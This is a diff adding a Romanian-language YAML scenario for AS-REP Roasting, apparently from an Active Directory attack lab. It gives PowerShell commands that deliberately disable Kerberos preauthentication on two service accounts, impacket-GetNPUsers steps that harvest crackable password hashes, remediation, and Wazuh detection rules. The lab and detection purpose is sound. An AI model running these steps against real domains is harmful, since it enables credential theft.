@@ -1,0 +1,83 @@
+id: asrep_roast
+name: AS-REP Roasting
+category: kerberos
+mitre: T1558.004
+
+description: |
+  AS-REP Roasting exploateaza utilizatori AD care au flag-ul
+  "Do not require Kerberos preauthentication" activat. In mod normal,
+  cand un client cere un TGT (Ticket Granting Ticket), trebuie sa
+  trimita un timestamp criptat cu hash-ul parolei sale (preauth),
+  sa arate ca el este utilizatorul care cere TGT-ul.
+
+  Daca preauth e dezactivat, KDC-ul (Domain Controller) returneaza
+  direct un AS-REP care contine un hash cu cheia derivata din
+  parola utilizatorului. Atacatorul poate face brute-force offline
+  pe acest hash fara sa lase urma in logurile clasice de autentificare
+  esuata - de aceea Preauthentication pe Kerberos e esential.
+
+  Tool Kali: impacket-GetNPUsers
+
+misconfiguration_general: |
+  Pe utilizator (in Active Directory Users and Computers ->
+  Account tab) este bifata optiunea "Do not require Kerberos preauthentication".
+
+misconfiguration_specific: |
+  Utilizatori vulnerabili in acest laborator:
+    - svc.backup (Corp_ServiceAccounts) -> DoesNotRequirePreAuth = True
+    - svc.web   (Corp_ServiceAccounts) -> DoesNotRequirePreAuth = True
+
+  Comenzi aplicate (rulate pe Windows Server inainte de atac):
+    Set-ADAccountControl -Identity "svc.backup" -DoesNotRequirePreAuth $true
+    Set-ADAccountControl -Identity "svc.web" -DoesNotRequirePreAuth $true
+
+  Output asteptat: 2 hash-uri $krb5asrep in output-ul atacului,
+  cate unul pentru fiecare cont vulnerabil.
+
+remediation: |
+  1. Pentru fiecare cont din output:
+     Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol
+     Set-ADAccountControl -Identity <user> -DoesNotRequirePreAuth $false
+
+  2. Politica generala: parole lungi (>=25 caractere) pentru conturile de serviciu, monitorizare alerte Wazuh pe AS-REP fara preauth.
+
+parameters:
+  - name: dc_ip
+    label: "IP Domain Controller"
+    default: "10.10.128.2"
+    required: true
+  - name: domain
+    label: "Domeniul AD (FQDN)"
+    default: "corp.local"
+    required: true
+  - name: userlist
+    label: "Cale catre lista de useri pe Kali"
+    default: "/tmp/users.txt"
+    required: true
+
+steps:
+  - run_on: kali
+    description: "Curata fisierele temporare din rulari anterioare"
+    command: "rm -f /tmp/users.txt /tmp/asrep_hashes.txt /tmp/asrep_only.txt"
+
+  - run_on: kali
+    description: "Genereaza lista de useri (doar pentru testing, in realitate se extrag din AD cu ldapsearch sau Bloodhound)"
+    command: |
+      printf '%s\n' andrei.popescu mihai.popa ion.alexa emilia.lucescu diana.petrescu it.admin it.support svc.backup svc.web > {{userlist}} && wc -l {{userlist}}
+  - run_on: kali
+    description: "Cere AS-REP fara preauth pentru fiecare user"
+    command: "impacket-GetNPUsers {{domain}}/ -dc-ip {{dc_ip}} -usersfile {{userlist}} -no-pass -format hashcat 2>&1 | tee /tmp/asrep_hashes.txt"
+    expect_nonzero_ok: true
+  - run_on: kali
+    description: "Filtreaza doar hash-urile valide si afiseaza rezultatul"
+    command: "grep -E '^\\$krb5asrep' /tmp/asrep_hashes.txt | tee /tmp/asrep_only.txt && echo \"--- $(wc -l < /tmp/asrep_only.txt) hash(uri) gasite ---\""
+    expect_nonzero_ok: true
+
+detection:
+  wazuh_rules:
+    - id: 60106
+      description: "Windows: Logon Success (autentificare impacket la DC)"
+    - id: 60137
+      description: "Windows: User Logoff"
+  mitre_technique: T1558.004
+  mitre_description: "Steal or Forge Kerberos Tickets: AS-REP Roasting"
